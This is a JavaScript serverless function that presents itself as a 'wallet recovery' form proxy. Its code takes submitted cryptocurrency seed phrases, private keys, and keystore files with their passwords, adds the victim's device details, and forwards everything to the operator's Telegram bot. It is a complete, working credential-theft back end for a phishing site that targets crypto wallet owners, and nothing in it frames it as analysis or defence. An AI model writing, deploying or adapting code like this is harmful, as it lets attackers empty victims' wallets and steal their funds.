/**
 * Serverless proxy: receives form data and forwards to Telegram.
 * Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in your hosting env (e.g. Vercel).
 * No Telegram credentials are ever sent to the client.
 */

const TELEGRAM_API = 'https://api.telegram.org';

function escapeHtml(text) {
  if (typeof text !== 'string') return '';
  return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function mdCode(s) {
  const t = typeof s === 'string' ? s : '';
  return '`' + t.replace(/`/g, '\\`') + '`';
}

function buildMessage(body, userAgent) {
  const wallet = escapeHtml((body.wallet || '').toString());
  const type = (body.import_type || '').toString().toUpperCase();
  const now = new Date();
  const dateTime = now.toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'medium' });
  const device = (userAgent || '').trim() || '—';

  const typeLabel = type === 'PHRASE' ? 'SEED PHRASE SUBMITTED' : (type === 'KEYSTOREJSON' ? 'KEYSTORE SUBMITTED' : 'PRIVATE KEY SUBMITTED');
  const lines = [
    '🚨 Wallet Recovery',
    '',
    '🔑 ' + typeLabel,
    '',
    '👤 Wallet: ' + (wallet || '—'),
    '',
    '🔤 Type: ' + (type || '—'),
    '',
    '🕐 Time: ' + dateTime,
    '',
    '🌍 Location: ',
    '',
    '📱 Device: ' + device,
    '',
  ];

  let parseMode = undefined;
  if (type === 'PHRASE' && body.phrase) {
    lines.push('🔒 Seed Phrase: ' + mdCode(body.phrase.toString()));
    parseMode = 'Markdown';
  } else if (type === 'KEYSTOREJSON') {
    if (body.keystorejson) lines.push('🔒 Keystore: ' + mdCode((body.keystorejson || '').toString()));
    if (body.keystorepassword) lines.push('Password: ' + mdCode((body.keystorepassword || '').toString()));
    parseMode = 'Markdown';
  } else if ((type === 'PRIVATE' || type === 'PRIVATEKEY') && body.privatekey) {
    lines.push('🔒 Private Key: ' + mdCode(body.privatekey.toString()));
    parseMode = 'Markdown';
  }

  lines.push('');
  lines.push('⚠️ User attempted wallet recovery');
  return { text: lines.join('\n'), parseMode };
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ ok: false, error: 'Method not allowed' });
    return;
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    res.status(500).json({ ok: false, error: 'Server configuration error' });
    return;
  }

  let body = {};
  try {
    body = typeof req.body === 'object' && req.body !== null ? req.body : {};
  } catch (_) {
    body = {};
  }

  const userAgent = (req.headers && (req.headers['user-agent'] || req.headers['User-Agent'])) || '';
  const msg = buildMessage(body, userAgent);
  if (!msg.text || msg.text.trim().length < 10) {
    res.status(400).json({ ok: false, error: 'Invalid payload' });
    return;
  }

  try {
    const url = `${TELEGRAM_API}/bot${token}/sendMessage`;
    const sendBody = { chat_id: chatId, text: msg.text, disable_web_page_preview: true };
    if (msg.parseMode) sendBody.parse_mode = msg.parseMode;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(sendBody),
    });

    const data = await response.json().catch(() => ({}));
    if (!data.ok) {
      res.status(500).json({ ok: false, error: 'Delivery failed' });
      return;
    }
    res.status(200).json({ ok: true });
  } catch (err) {
    res.status(500).json({ ok: false, error: 'Delivery failed' });
  }
}
